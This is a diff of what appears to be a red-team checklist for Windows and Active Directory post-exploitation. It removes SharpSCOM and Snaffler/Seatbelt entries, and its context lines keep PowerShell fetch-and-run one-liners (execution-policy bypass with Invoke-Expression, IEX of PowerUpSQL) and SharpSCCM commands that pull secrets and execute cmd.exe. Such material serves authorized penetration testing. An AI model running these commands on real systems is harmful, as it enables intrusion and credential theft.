@@ -37,9 +37,6 @@ powershell -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadS
 
 <img width="1866" height="1052" alt="image" src="https://github.com/user-attachments/assets/e8d43abc-e297-428b-91f1-3ff7d63660e4" />
 
-
-- [ ] Snaffler
-- [ ] Seatbelt
 - [ ] MSSQL
 ```powershell
 IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
@@ -51,13 +48,6 @@ SharpSCCM.exe local secrets -m disk
 SharpSCCM.exe get collections
 SharpSCCM.exe exec -rid  -p "C:\Windows\System32\cmd.exe"
 ```
-- [ ] [SharpSCOM](https://github.com/breakfix/SharpSCOM) - SCOM Enumeration
-```powershell
-SharpSCOM.exe get-server
-SharpSCOM.exe get-creds
-```
-
-## Other Tools
 
 Most likely these should be run across the network as well.
 
